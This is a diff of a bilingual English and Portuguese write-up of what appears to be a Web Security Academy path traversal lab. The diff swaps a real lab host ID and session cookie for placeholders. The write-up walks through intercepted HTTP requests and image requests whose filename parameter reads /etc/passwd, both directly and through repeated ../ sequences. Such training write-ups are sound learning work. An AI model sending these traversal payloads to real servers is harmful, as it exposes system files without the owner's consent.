@@ -16,13 +16,13 @@ First, i intercepted a request made to one of the available products on the web 
 (Primeiro, eu interceptei uma requisição feita a um dos produtos disponíveis no website, essa requisição tinha o seguinte conteúdo:)
 
 GET /product?productId=1 HTTP/1.1
-Host: 0acb003f042a5a72824d249c002c0011.web-security-academy.net
-Cookie: session=euVNaxOzVw3FpYzJEGyrv2p2c1yCKiud
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0acb003f042a5a72824d249c002c0011.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -36,13 +36,13 @@ After i forwarded this request, it´s performed another request that brings the 
 (Após encaminhar essa requisição, é realizada mais uma requisição usada para trazer a imagem do produto para a pagina:)
 
 GET /image?filename=24.jpg HTTP/2
-Host: 0acb003f042a5a72824d249c002c0011.web-security-academy.net
-Cookie: session=euVNaxOzVw3FpYzJEGyrv2p2c1yCKiud
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0acb003f042a5a72824d249c002c0011.web-security-academy.net/product?productId=1
+Referer: https://LAB_ID.web-security-academy.net/product?productId=1
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -53,13 +53,13 @@ Das duas requisições interceptadas, a segunda tem um parâmetro muito mais int
 o conteúdo do arquivo /etc/passwd, se colocarmos esse caminho no parâmetro filename:
 
 GET /image?filename=/etc/passwd HTTP/2
-Host: 0acb003f042a5a72824d249c002c0011.web-security-academy.net
-Cookie: session=euVNaxOzVw3FpYzJEGyrv2p2c1yCKiud
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0acb003f042a5a72824d249c002c0011.web-security-academy.net/product?productId=1
+Referer: https://LAB_ID.web-security-academy.net/product?productId=1
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -79,13 +79,13 @@ Isso acontece pois o parâmetro filename se refere a uma localização dentro do
 o caminho para o arquivo, como não sabemos o quão afastado estamos do diretório raiz, podemos utilizar varias sequências de travessia, como segue:
 
 GET /image?filename=../../../../../../../../etc/passwd HTTP/2
-Host: 0acb003f042a5a72824d249c002c0011.web-security-academy.net
-Cookie: session=euVNaxOzVw3FpYzJEGyrv2p2c1yCKiud
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0acb003f042a5a72824d249c002c0011.web-security-academy.net/product?productId=1
+Referer: https://LAB_ID.web-security-academy.net/product?productId=1
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
